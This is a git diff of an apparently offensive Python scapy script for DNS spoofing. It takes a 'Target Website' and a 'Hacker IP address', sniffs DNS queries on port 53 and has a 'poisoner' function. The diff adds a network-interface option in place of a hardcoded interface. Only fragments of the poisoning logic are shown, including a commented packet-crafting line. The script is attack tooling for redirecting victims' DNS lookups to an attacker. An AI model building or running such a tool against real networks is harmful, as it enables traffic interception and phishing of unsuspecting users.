@@ -15,11 +15,14 @@ def get_arguments():
                         help="Target Website")
     parser.add_argument("-i", "--ip-address", dest="ip",
                         help="Hacker IP address")
+    parser.add_argument("-I", "--Interface", dest="Interface",
+                        help="Network Interface")
     opt = parser.parse_args()
     return opt
 
 def sniffer(pkt):
     pkt_time = pkt.sprintf('%sent.time%')
+    
     try:
         if DNSQR in pkt and pkt.dport == 53:
             print('[**] Detected DNS QR Message at: ' + pkt_time)
@@ -37,6 +40,7 @@ def sniffer(pkt):
 def poisoner(pkt):
     #### poison = IP(src=src , dst=dst , ttl=128 )/UDP(dport=53)/DNS(rd=1 , qd=DNSQR(qname=qname ,qtype=qtype))
     qname = pkt[DNSQR].qname.decode()
+    opt = get_arguments()
     # dns_id = pkt.id
     
     if DNSRR in pkt:
@@ -53,11 +57,10 @@ def poisoner(pkt):
 
 if __name__ == "__main__":
     try:
-        get_arguments()
+        opt = get_arguments()
         gate = input("[WARNING] Make Sure Selected Interface is in PRIVATE NETWORK!![yN]")
         if gate == "y" or gate == "Y":
-            interface = 'wlp0s20f3'
             filter_bpf = 'udp and port 53'
-            sniff(iface=interface, filter=filter_bpf, store=0,  prn=sniffer)
+            sniff(iface=opt.Interface, filter=filter_bpf, store=0,  prn=sniffer)
     except:
         sys.exit(1)
